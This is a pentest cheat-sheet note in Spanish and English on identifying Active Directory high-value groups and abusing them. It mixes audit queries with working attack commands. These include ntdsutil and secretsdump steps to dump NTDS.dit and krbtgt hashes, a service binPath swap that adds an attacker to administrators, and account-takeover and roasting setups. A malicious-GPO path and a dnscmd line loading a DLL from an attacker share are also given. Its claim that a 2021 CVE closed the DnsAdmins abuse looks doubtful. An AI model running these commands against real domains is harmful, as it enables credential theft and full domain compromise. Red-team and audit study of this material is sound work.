---
aliases:
  - High-Value Groups
  - DnsAdmins Privesc
  - Backup Operators
  - Privileged Identity Groups
tags:
  - type/technique
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: SubCheatSheet
linked:
  - '[[AD - Groups Enumeration]]'
---
# AD - Groups Enumeration - High-Value Group Identification

***

## Tier 0 (Forest/Domain Critical)

| **Group** | **Privilegio** | **Path a DA** |
|:---:|:---:|:---:|
| Domain Admins | Full domain control | Direct (es Tier 0). |
| Enterprise Admins | Forest-wide control | Direct forest takeover. |
| Schema Admins | Schema modification | Persistence via schema attack. |
| Administrators | Per-host admin (DC = full domain) | Direct si en DC. |
| Backup Operators | NTDS dump | Via ntdsutil + secretsdump. |
| Server Operators | Logon DC + service mod | Service binPath swap. |
| Account Operators | Crear/modify users non-Tier 0 | Privesc via target user. |
| Print Operators | Driver install en DC | Legacy RCE. |
| DnsAdmins | DLL plugin | Pre-CVE-2021-40469 RCE en DC. |
| Group Policy Creator Owners | Crear GPOs | + linking = mass compromise. |
| Cloneable Domain Controllers | DC clone | Direct DC compromise. |
^ad-hvgroup-tier0

```powershell
# Audit completo Tier 0 + Tier 0/1
$Tier0 = "Domain Admins","Enterprise Admins","Schema Admins","Administrators",
         "Account Operators","Backup Operators","Server Operators","Print Operators",
         "DnsAdmins","Group Policy Creator Owners","Cloneable Domain Controllers",
         "Cert Publishers"

foreach ($g in $Tier0) {
  $m = Get-ADGroupMember $g -Recursive -EA SilentlyContinue
  if ($m) {
    Write-Host "`n=== $g ($($m.Count) members) ==="
    $m | Select Name,SamAccountName,objectClass | Ft -A
  }
}
```

___

## Backup Operators (NTDS Dump Path)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `ntdsutil "activate instance ntds" "ifm" "create full c:\dump" "quit" "quit"` | Backup completo NTDS.dit + SYSTEM hive | DC con BO membership. |
| `secretsdump.py -ntds c:\dump\Active Directory\ntds.dit -system c:\dump\registry\SYSTEM LOCAL` | Parse offline + dump hashes (incluye krbtgt) | Linux post-exfil. |
| `diskshadow /s script.txt` | VSS snapshot alternativo | Sin ntdsutil. |
| `Get-ADGroupMember "Backup Operators" -Recursive` | Members BO | Audit. |
^ad-hvgroup-backup

**Privileges clave:** `SeBackupPrivilege` (read any file) + `SeRestorePrivilege` (write any file) + logon DC. Resultado: read NTDS.dit + SYSTEM hive offline = full hash dump = krbtgt = Golden Ticket.

```cmd
:: Workflow desde DC con BO membership
ntdsutil "activate instance ntds" "ifm" "create full C:\dump" "quit" "quit"

:: Exfiltrar:
:: C:\dump\Active Directory\ntds.dit
:: C:\dump\registry\SYSTEM
```

```bash
# Parse offline en Linux
impacket-secretsdump -ntds 'ntds.dit' -system 'SYSTEM' LOCAL
```

___

## Server Operators (DC Logon Path)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `sc config <svc> binPath= "cmd.exe /c net localgroup administrators atacante /add"` | Modify service binary | SO en DC. |
| `sc stop <svc> && sc start <svc>` | Trigger payload (SYSTEM context) | Post-modify. |
| `Get-ADGroupMember "Server Operators" -Recursive` | Members SO | Audit. |
^ad-hvgroup-serverop

**Privileges:** logon local DC + modify services + modify registry. Combo `sc config` + restart = SYSTEM RCE en DC = path a DA.

___

## Account Operators

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Set-ADAccountPassword -Identity <non-priv-user> -NewPassword (ConvertTo-SecureString "X" -AsPlainText -Force) -Reset` | Reset password de non-priv user | AO membership. |
| `Set-ADUser -Identity <user> -ServicePrincipalNames @{Add="HTTP/fake"}` | Add SPN (Targeted Kerberoast setup) | AO + ACL allows. |
| `Set-ADAccountControl -Identity <user> -DoesNotRequirePreAuth $true` | Force AS-REP roastable (Targeted) | AO. |
| `Set-ADObject <user-DN> -Add @{"msDS-KeyCredentialLink"=...}` | Shadow Cred si tenés WriteProperty | Modern abuse. |
^ad-hvgroup-accountop

**Limitations:** AO **no puede** modificar `adminCount=1` users (AdminSDHolder protege). Pero puede modificar service accounts, helpdesk users, otros Tier 1 = privesc lateral.

___

## Group Policy Creator Owners

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ADGroupMember "Group Policy Creator Owners" -Recursive` | Members | Audit. |
| `New-GPO -Name "MaliciousGPO"` | Crear GPO (necesita group membership) | Pre-attack. |
| `Set-GPLink -Name "MaliciousGPO" -Target "<OU-DN>"` | Link a OU | Necesita WriteProperty `gPLink` separado. |
| `Get-GPInheritance -Target "<OU-DN>"` | Ver GPOs aplicados a OU | Reconnaissance. |
^ad-hvgroup-gpocreator

**Por qué importa:** miembros pueden crear GPOs nuevos. Si combinás con `WriteProperty` sobre `gPLink` de OU = link malicious GPO a Tier 0 OU = mass compromise.

___

## DnsAdmins (Legacy CVE-2021-40469)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ADGroupMember "DnsAdmins" -Recursive` | Members (debe estar vacío) | Audit. |
| `dnscmd <DC> /config /serverlevelplugindll \\attacker\share\evil.dll` | Set DLL plugin (legacy) | Pre-patch. |
| `sc stop dns && sc start dns` | Trigger DLL load (SYSTEM en DC) | Post-set. |
^ad-hvgroup-dnsadmins

**Status:** patched **CVE-2021-40469** (Sept 2021). Modern DCs requieren local admin. Environments legacy unpatched siguen vulnerables. **Default empty = best practice**.

___

## Cert Publishers (ADCS Adjacent)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ADGroupMember "Cert Publishers" -Recursive` | Members (típicamente CA computer accounts) | Audit. |
| `Get-ADGroupMember "Cert Publishers" -Recursive \| ? objectClass -eq "user"` | User members (sospechoso) | Anomaly hunt. |
| `certipy find -u u -p pass -dc-ip <DC>` | Audit ADCS templates + CAs | Adjacent. |
^ad-hvgroup-certpub

**Members default:** computer accounts de CAs. Users/groups inusuales = audit finding. Privilegio: añadir CA certs al **NTAuth Store** (cualquier cert emitido por esos CAs es válido para Kerberos auth).

___

## Custom Privileged Groups

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ADGroup -Filter {AdminCount -eq 1}` | Groups con AdminSDHolder protection | Tier 0/1 list. |
| `Get-ADGroup -Filter * \| ? Name -match "(?i)admin\|priv\|tier0\|elevated\|domain"` | Naming pattern match | Custom Tier 0/1 hunt. |
| `Get-ADGroup -Filter * -Pr Description \| ? Description -match "(?i)admin\|priv\|service"` | Description-based discovery | OSINT-clue. |
| `Get-ADGroupMember "Domain Admins" -Recursive \| ? objectClass -eq "group"` | Nested groups en DA (custom Tier 0) | Hidden privilege. |
^ad-hvgroup-custom

```powershell
# Hunt custom Tier 0 — groups que contienen Tier 0 directo
$Tier0SIDs = @(
  (Get-ADGroup "Domain Admins").SID.Value,
  (Get-ADGroup "Enterprise Admins" -Server (Get-ADForest).RootDomain).SID.Value
)

Get-ADGroup -Filter * -Properties Members | Where {
  $_.Members | Where {
    $member = Get-ADObject $_ -Properties objectSid -EA SilentlyContinue
    $member.objectSid.Value -in $Tier0SIDs
  }
} | Select Name,DistinguishedName
```

***
